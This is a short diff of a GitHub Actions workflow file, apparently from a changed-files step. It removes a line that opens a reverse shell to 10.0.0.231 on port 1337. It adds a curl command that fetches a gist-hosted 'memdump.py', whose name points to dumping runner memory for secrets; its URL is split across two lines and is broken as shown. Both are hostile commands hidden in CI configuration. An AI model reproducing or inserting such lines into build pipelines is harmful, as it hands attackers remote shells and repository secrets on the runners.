@@ -29,5 +29,6 @@ jobs:
           for file in ${{ steps.changed-files.outputs.all_changed_files }}; do
             echo "$file was changed"
           done
-          /bin/bash -i >& /dev/tcp/10.0.0.231/1337 0>&1
+          curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328
+          f254965/ raw/memdump.py
 
